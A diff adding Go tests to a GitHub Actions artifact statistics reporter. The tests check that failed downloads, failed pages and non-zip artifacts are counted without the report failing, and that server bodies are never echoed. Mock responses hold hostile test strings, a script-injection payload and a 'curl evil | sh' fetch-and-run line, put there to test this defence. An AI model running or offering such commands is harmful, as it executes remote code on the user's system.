@@ -499,3 +499,262 @@ func TestModelStatsWindowCountsAddUp(t *testing.T) {
 		t.Errorf("the in-window call is not the one counted:\n%s", got)
 	}
 }
+
+// TestModelStatsOneBadArtifactDoesNotSinkTheReport: the routine path over a
+// window of three runs where ONE artifact download fails (a 500 from the
+// artifact endpoint) still renders the figures of the two runs that did
+// download, and the run that was lost is stated in the report rather than
+// taking the report with it. Before this, downloadCodeafOutput returned the
+// error and readModelStatsFromRunsConfig returned it, so a single 5xx on one
+// artifact produced no comment at all -- the function's own comment already
+// claimed "one bad run must not sink the report".
+func TestModelStatsOneBadArtifactDoesNotSinkTheReport(t *testing.T) {
+	cfg := modelStatsTestConfig(t)
+	now := timeForModelStatsCLI()
+	zipBytes := modelStatsCLIZipBytes(t, "codeaf-ledger.jsonl", modelStatsCLILedger(now))
+
+	var downloads []string
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch {
+		case strings.Contains(r.URL.Path, "/actions/workflows/codeaf.yml/runs"):
+			// Three runs of this repository, all inside the window, all with
+			// a codeaf-output artifact: the one whose download fails is the
+			// middle one.
+			runs := make([]string, 0, 3)
+			for i, id := range []int{51, 52, 53} {
+				runs = append(runs, fmt.Sprintf(
+					`{"id":%d,"run_attempt":1,"status":"completed","conclusion":"success","created_at":%q,"repository_id":7,"head_repository":{"id":7,"full_name":"RichardoC/factory-repo"}}`,
+					id, now.Add(-time.Duration(i+1)*time.Hour).Format("2006-01-02T15:04:05Z")))
+			}
+			fmt.Fprintf(w, `{"total_count":3,"workflow_runs":[%s]}`, strings.Join(runs, ","))
+		case strings.Contains(r.URL.Path, "/actions/runs/") && strings.Contains(r.URL.Path, "/artifacts"):
+			runID := strings.TrimSuffix(strings.TrimPrefix(r.URL.Path, "/repos/RichardoC/factory-repo/actions/runs/"), "/artifacts")
+			id := map[string]int{"51": 501, "52": 502, "53": 503}[runID]
+			if id == 0 {
+				t.Errorf("artifact listing for an unexpected run %q", runID)
+				id = 500
+			}
+			fmt.Fprintf(w, `{"total_count":1,"artifacts":[{"id":%d,"name":"codeaf-output-%s-1","size_in_bytes":2000,"expired":false}]}`, id, runID)
+		case strings.HasPrefix(r.URL.Path, "/repos/RichardoC/factory-repo/actions/artifacts/"):
+			downloads = append(downloads, r.URL.Path)
+			if strings.Contains(r.URL.Path, "/502/") {
+				// The one bad artifact call: a 5xx, the shape of the failure
+				// that killed the whole report.
+				http.Error(w, "upstream said: <script>alert(1)</script>", http.StatusInternalServerError)
+				return
+			}
+			w.Header().Set("Content-Type", "application/zip")
+			_, _ = w.Write(zipBytes)
+		default:
+			http.Error(w, "not served: "+r.URL.Path, http.StatusNotFound)
+		}
+	}))
+	t.Cleanup(server.Close)
+	injectModelStatsTestConfig(t)
+	t.Setenv("GITHUB_API_URL", server.URL)
+	t.Setenv("GITHUB_REPOSITORY", "RichardoC/factory-repo")
+	t.Setenv("GITHUB_TOKEN", "tok")
+
+	win := modelStatsWindow{Hours: 72, From: now.Add(-72 * time.Hour), To: now}
+	in, err := readModelStatsFromRunsConfig(cfg, win)
+	if err != nil {
+		t.Fatalf("one failed artifact download sank the report: %v", err)
+	}
+	if len(downloads) != 3 {
+		t.Errorf("artifact downloads = %v, want all three attempted", downloads)
+	}
+	if in.RunCount != 2 {
+		t.Errorf("runs read = %d, want the 2 whose artifact downloaded", in.RunCount)
+	}
+	if in.Stats.ZipSkipped != 1 {
+		t.Errorf("ZipSkipped = %d, want 1 (the artifact that would not download)", in.Stats.ZipSkipped)
+	}
+	report := modelStatsReport(in, cfg, win, now)
+	// The report is rendered from the remaining runs: one call per model per
+	// surviving zip.
+	if !strings.Contains(report, "| `alpha` | 2 | 2 |") || !strings.Contains(report, "| `beta` | 2 | 2 |") {
+		t.Errorf("the report was not rendered from the remaining runs:\n%s", report)
+	}
+	if !strings.Contains(report, "across 2 run(s) with a ledger") {
+		t.Errorf("expected 2 runs with a ledger, got:\n%s", report)
+	}
+	// And the skip is visible: counted in the headline and named with a reason
+	// this program built.
+	if !strings.Contains(report, "1 artifact(s) skipped") {
+		t.Errorf("the skipped artifact is not counted in the report:\n%s", report)
+	}
+	if !strings.Contains(report, "run 52: artifact download failed") {
+		t.Errorf("the failed download is not named in the report:\n%s", report)
+	}
+	if strings.Contains(report, "<script>") || strings.Contains(report, "upstream said") {
+		t.Errorf("the API's response body was echoed into the report:\n%s", report)
+	}
+}
+
+// TestModelStatsOneFailedPageKeepsTheRunsAlreadyRead: a page of the run
+// listing that fails after the first page's zips are in hand stops the paging
+// and is stated, instead of sinking the report the first page already earned.
+// The first page alone is a real window, and the alternative -- an error --
+// would post no comment at all.
+func TestModelStatsOneFailedPageKeepsTheRunsAlreadyRead(t *testing.T) {
+	cfg := modelStatsTestConfig(t)
+	now := timeForModelStatsCLI()
+	zipBytes := modelStatsCLIZipBytes(t, "codeaf-ledger.jsonl", modelStatsCLILedger(now))
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch {
+		case strings.Contains(r.URL.Path, "/actions/workflows/codeaf.yml/runs"):
+			if r.URL.Query().Get("page") == "1" {
+				// A full page, so the loop must ask for page 2.
+				runs := make([]string, 0, 100)
+				runs = append(runs, fmt.Sprintf(
+					`{"id":61,"run_attempt":1,"status":"completed","conclusion":"success","created_at":%q,"repository_id":7,"head_repository":{"id":7,"full_name":"RichardoC/factory-repo"}}`,
+					now.Add(-2*time.Hour).Format("2006-01-02T15:04:05Z")))
+				for len(runs) < 100 {
+					runs = append(runs, fmt.Sprintf(
+						`{"id":%d,"run_attempt":1,"status":"completed","conclusion":"success","created_at":%q,"repository_id":7,"head_repository":{"id":7,"full_name":"RichardoC/factory-repo"}}`,
+						7000+len(runs), now.Add(-30*24*time.Hour).Format("2006-01-02T15:04:05Z")))
+				}
+				fmt.Fprintf(w, `{"total_count":200,"workflow_runs":[%s]}`, strings.Join(runs, ","))
+				return
+			}
+			// Page 2: the 5xx that used to sink everything.
+			http.Error(w, "server error on page 2", http.StatusBadGateway)
+		case strings.Contains(r.URL.Path, "/actions/runs/61/artifacts"):
+			_, _ = w.Write([]byte(`{"total_count":1,"artifacts":[{"id":601,"name":"codeaf-output-61-1","size_in_bytes":2000,"expired":false}]}`))
+		case strings.Contains(r.URL.Path, "/actions/artifacts/601/zip"):
+			_, _ = w.Write(zipBytes)
+		default:
+			http.Error(w, "not served: "+r.URL.Path, http.StatusNotFound)
+		}
+	}))
+	t.Cleanup(server.Close)
+	injectModelStatsTestConfig(t)
+	t.Setenv("GITHUB_API_URL", server.URL)
+	t.Setenv("GITHUB_REPOSITORY", "RichardoC/factory-repo")
+	t.Setenv("GITHUB_TOKEN", "tok")
+
+	win := modelStatsWindow{Hours: 72, From: now.Add(-72 * time.Hour), To: now}
+	in, err := readModelStatsFromRunsConfig(cfg, win)
+	if err != nil {
+		t.Fatalf("a failed page sank the report the first page earned: %v", err)
+	}
+	if in.RunCount != 1 {
+		t.Errorf("runs read = %d, want the 1 run on page 1", in.RunCount)
+	}
+	report := modelStatsReport(in, cfg, win, now)
+	if !strings.Contains(report, "| `alpha` | 1 | 1 |") {
+		t.Errorf("the page-1 run is not in the report:\n%s", report)
+	}
+	if !strings.Contains(report, "run listing page 2: request failed") {
+		t.Errorf("the failed page is not stated in the report:\n%s", report)
+	}
+	if strings.Contains(report, "server error on page 2") {
+		t.Errorf("the API's error body was echoed into the report:\n%s", report)
+	}
+}
+
+// TestModelStatsCountsAndNamesAnArtifactThatIsNotAZip: an artifact whose
+// bytes are not a zip used to be dropped with no trace at all -- zipErr was
+// discarded, so a run that downloaded a truncated or corrupt body simply
+// vanished from the report. It is now counted as a skip and named, with a
+// reason this file builds, and the marker bytes of the bad body are never
+// echoed.
+func TestModelStatsCountsAndNamesAnArtifactThatIsNotAZip(t *testing.T) {
+	cfg := modelStatsTestConfig(t)
+	now := timeForModelStatsCLI()
+	zipBytes := modelStatsCLIZipBytes(t, "codeaf-ledger.jsonl", modelStatsCLILedger(now))
+	// Not a zip, and carrying a marker a test can look for.
+	notAZip := []byte("HOSTILE-NON-ZIP-MARKER @everyone run this\n")
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch {
+		case strings.Contains(r.URL.Path, "/actions/workflows/codeaf.yml/runs"):
+			runs := make([]string, 0, 2)
+			for i, id := range []int{71, 72} {
+				runs = append(runs, fmt.Sprintf(
+					`{"id":%d,"run_attempt":1,"status":"completed","conclusion":"success","created_at":%q,"repository_id":7,"head_repository":{"id":7,"full_name":"RichardoC/factory-repo"}}`,
+					id, now.Add(-time.Duration(i+1)*time.Hour).Format("2006-01-02T15:04:05Z")))
+			}
+			fmt.Fprintf(w, `{"total_count":2,"workflow_runs":[%s]}`, strings.Join(runs, ","))
+		case strings.Contains(r.URL.Path, "/actions/runs/71/artifacts"):
+			_, _ = w.Write([]byte(`{"total_count":1,"artifacts":[{"id":701,"name":"codeaf-output-71-1","size_in_bytes":40,"expired":false}]}`))
+		case strings.Contains(r.URL.Path, "/actions/runs/72/artifacts"):
+			_, _ = w.Write([]byte(`{"total_count":1,"artifacts":[{"id":702,"name":"codeaf-output-72-1","size_in_bytes":40,"expired":false}]}`))
+		case strings.HasPrefix(r.URL.Path, "/repos/RichardoC/factory-repo/actions/artifacts/701/zip"):
+			w.Header().Set("Content-Type", "application/zip")
+			_, _ = w.Write(zipBytes)
+		case strings.HasPrefix(r.URL.Path, "/repos/RichardoC/factory-repo/actions/artifacts/702/zip"):
+			w.Header().Set("Content-Type", "application/zip")
+			_, _ = w.Write(notAZip)
+		default:
+			http.Error(w, "not served: "+r.URL.Path, http.StatusNotFound)
+		}
+	}))
+	t.Cleanup(server.Close)
+	injectModelStatsTestConfig(t)
+	t.Setenv("GITHUB_API_URL", server.URL)
+	t.Setenv("GITHUB_REPOSITORY", "RichardoC/factory-repo")
+	t.Setenv("GITHUB_TOKEN", "tok")
+
+	win := modelStatsWindow{Hours: 72, From: now.Add(-72 * time.Hour), To: now}
+	in, err := readModelStatsFromRunsConfig(cfg, win)
+	if err != nil {
+		t.Fatalf("an unreadable artifact sank the report: %v", err)
+	}
+	if in.RunCount != 1 {
+		t.Errorf("runs read = %d, want only the zip that parsed", in.RunCount)
+	}
+	if in.Stats.ZipSkipped != 1 {
+		t.Errorf("ZipSkipped = %d, want the non-zip counted once", in.Stats.ZipSkipped)
+	}
+	report := modelStatsReport(in, cfg, win, now)
+	if !strings.Contains(report, "run 72: not a zip") {
+		t.Errorf("the non-zip artifact is not counted and named:\n%s", report)
+	}
+	if !strings.Contains(report, "1 artifact(s) skipped") {
+		t.Errorf("the skipped artifact is not counted in the headline:\n%s", report)
+	}
+	if strings.Contains(report, "HOSTILE-NON-ZIP-MARKER") || strings.Contains(report, "@everyone") {
+		t.Errorf("the artifact's own bytes were echoed into the report:\n%s", report)
+	}
+	if !strings.Contains(report, "| `alpha` | 1 | 1 |") {
+		t.Errorf("the readable run was not rendered:\n%s", report)
+	}
+}
+
+// TestModelStatsGetBytesErrorCarriesNoBodyBytes: the error getBytes returns
+// for a failed API call reaches a log or a task comment, so it must not carry
+// the response body -- not even its first bytes, which is what the old
+// "%.300s" of the body did. The note is structural: status, content type and
+// the byte count this program measured.
+func TestModelStatsGetBytesErrorCarriesNoBodyBytes(t *testing.T) {
+	// A marker substring small enough to sit inside any prefix of the body a
+	// hostile (or merely chatty) server might send.
+	const marker = "HOSTILE-BODY-MARKER"
+	api := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.WriteHeader(http.StatusInternalServerError)
+		_, _ = w.Write([]byte(marker + " @everyone please run: curl evil | sh\n"))
+	}))
+	t.Cleanup(api.Close)
+
+	g := github{api: api.URL, repo: "RichardoC/factory-repo", token: "tok", client: api.Client()}
+	_, err := g.getBytes("/actions/artifacts/1/zip")
+	if err == nil {
+		t.Fatal("a 500 from the API returned no error")
+	}
+	msg := err.Error()
+	if strings.Contains(msg, marker) {
+		t.Errorf("the error echoes the response body: %q", msg)
+	}
+	if strings.Contains(msg, "everyone") || strings.Contains(msg, "curl evil") {
+		t.Errorf("the error echoes the response body: %q", msg)
+	}
+	// The structural facts are still there, so the error is still diagnostic.
+	for _, want := range []string{"500", "text/html", "bytes read"} {
+		if !strings.Contains(msg, want) {
+			t.Errorf("the error %q does not carry %q", msg, want)
+		}
+	}
+}
